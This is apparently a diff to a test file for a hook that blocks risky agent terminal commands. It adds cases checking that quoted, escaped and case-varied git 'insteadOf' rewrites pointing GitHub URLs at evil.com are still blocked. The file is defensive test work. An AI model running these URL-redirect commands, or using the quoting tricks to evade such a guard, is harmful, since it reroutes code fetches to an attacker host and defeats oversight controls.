@@ -558,6 +558,13 @@ g "config insteadof case variant" block '{"tool_name":"terminal","tool_input":{"
 g "git -c insteadOf one-shot fetch" block '{"tool_name":"terminal","tool_input":{"command":"git -c url.https://evil.com/.insteadOf=https://github.com/ fetch"}}'
 g "git --config-env insteadOf one-shot fetch" block '{"tool_name":"terminal","tool_input":{"command":"git --config-env=url.https://evil.com/.insteadOf=R fetch"}}'
 g "git config set insteadOf rewrite" block '{"tool_name":"terminal","tool_input":{"command":"git config set url.https://evil.com/.insteadOf https://github.com/"}}'
+# HIMMEL-844 round 3: a dequoted key is the same key — quoting/escaping must not slip past.
+g "git config single-quoted insteadOf key" block '{"tool_name":"terminal","tool_input":{"command":"git config '"'"'url.https://evil.com/.insteadOf'"'"' https://github.com/"}}'
+g "git config double-quoted insteadOf key" block '{"tool_name":"terminal","tool_input":{"command":"git config \"url.https://evil.com/.insteadOf\" https://github.com/"}}'
+g "git config backslash-split insteadOf key" block '{"tool_name":"terminal","tool_input":{"command":"git config ur\\l.https://evil.com/.insteadOf https://github.com/"}}'
+g "git config ANSI-C quoted insteadOf key" block '{"tool_name":"terminal","tool_input":{"command":"git config $'"'"'url.https://evil.com/.insteadOf'"'"' https://github.com/"}}'
+g "git config upper-case URL.INSTEADOF key" block '{"tool_name":"terminal","tool_input":{"command":"git config URL.https://evil.com/.INSTEADOF https://github.com/"}}'
+g "git -c quoted insteadOf one-shot fetch" block '{"tool_name":"terminal","tool_input":{"command":"git -c '"'"'url.https://evil.com/.insteadOf=https://github.com/'"'"' fetch"}}'
 g "config --get insteadOf READ allowed" allow '{"tool_name":"terminal","tool_input":{"command":"git config --get url.https://x/.insteadOf"}}'
 g "config user.name allowed" allow '{"tool_name":"terminal","tool_input":{"command":"git config user.name x"}}'
 g "remote -v allowed" allow '{"tool_name":"terminal","tool_input":{"command":"git remote -v"}}'
